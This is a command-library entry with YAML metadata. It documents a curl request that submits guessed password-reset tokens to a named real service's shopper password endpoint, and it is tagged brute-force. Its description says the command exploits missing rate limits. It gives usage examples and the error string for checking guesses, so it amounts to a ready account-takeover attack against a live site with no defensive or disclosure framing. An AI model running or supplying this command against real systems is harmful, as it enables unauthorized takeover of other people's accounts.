---
data: >-
  curl -X POST https://shoppers.instacart.com/password -d "utf8=%E2%9C%93" -d
  "_method=put" -d "authenticity_token=your_token_here" -d
  "driver[reset_password_token]=guessed_token" -d
  "driver[password]=new_password" -d
  "driver[password_confirmation]=new_password" -d "commit=Change+my+password" -b
  cookies.txt -v
tags:
  - web
  - brute-force
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:06.549Z'
id: 11d1341d-7699-45db-aeed-6b7d2ebd6d75
verified: false
validated: true
submitted: true
---
# curl-post-password-reset

## Command

```bash
curl -X POST https://shoppers.instacart.com/password -d "utf8=%E2%9C%93" -d "_method=put" -d "authenticity_token=your_token_here" -d "driver[reset_password_token]=guessed_token" -d "driver[password]=new_password" -d "driver[password_confirmation]=new_password" -d "commit=Change+my+password" -b cookies.txt -v
```

## Description

Submits a guessed reset token to the Instacart password endpoint to validate and change the password, exploiting no rate limits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d "_method=put"` | Rails method override for update | Yes |
| `-d "driver[reset_password_token]=..."` | Guessed 20-char token | Yes |
| `-d "driver[password]=..."` | New password | Yes |
| `-d "driver[password_confirmation]=..."` | Password confirmation | Yes |
| `-v` | Verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl -X POST https://shoppers.instacart.com/password -d "utf8=%E2%9C%93" -d "_method=put" -d "authenticity_token=abc" -d "driver[reset_password_token]=ABC123..." -d "driver[password]=pass123" -d "driver[password_confirmation]=pass123" -d "commit=Change+my+password" -b cookies.txt
```

### Advanced Usage

```bash
curl -X POST ... | grep "invalid"  # Check for error
```

## Expected Output

'Reset password token is invalid' for failures; success page or redirect on valid token.

## Related

- [[commands/curl-post-reset-initiate]]
